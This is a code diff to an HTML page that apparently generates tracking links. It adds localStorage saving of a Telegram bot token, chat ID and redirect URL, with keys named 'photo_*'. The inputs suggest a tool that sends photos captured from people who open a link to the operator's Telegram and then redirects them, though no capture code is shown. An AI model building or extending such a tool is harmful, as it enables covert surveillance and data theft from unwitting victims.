@@ -16,10 +16,32 @@
         <input type="text" id="token" placeholder="Telegram Bot Token" required>
         <input type="text" id="chatid" placeholder="Telegram Chat ID" required>
         <input type="text" id="redirect" placeholder="Redirect URL (e.g. https://example.com)" required>
+        <button onclick="saveData()">Save</button>
         <button onclick="generate()">Generate Link</button>
         <div id="result"></div>
     </div>
     <script>
+        // Load data from localStorage when page opens
+        window.onload = function() {
+            document.getElementById('token').value = localStorage.getItem('photo_token') || '';
+            document.getElementById('chatid').value = localStorage.getItem('photo_chatid') || '';
+            document.getElementById('redirect').value = localStorage.getItem('photo_redirect') || '';
+        };
+
+        function saveData() {
+            const token = document.getElementById('token').value.trim();
+            const chat = document.getElementById('chatid').value.trim();
+            const redirect = document.getElementById('redirect').value.trim();
+            if (!token || !chat || !redirect) {
+                alert("Please Enter Token, Chat ID, and Redirect URL to save");
+                return;
+            }
+            localStorage.setItem('photo_token', token);
+            localStorage.setItem('photo_chatid', chat);
+            localStorage.setItem('photo_redirect', redirect);
+            alert('Saved! Now these values will auto-fill next time.');
+        }
+
         function generate() {
             const token = encodeURIComponent(document.getElementById('token').value.trim());
             const chat = encodeURIComponent(document.getElementById('chatid').value.trim());
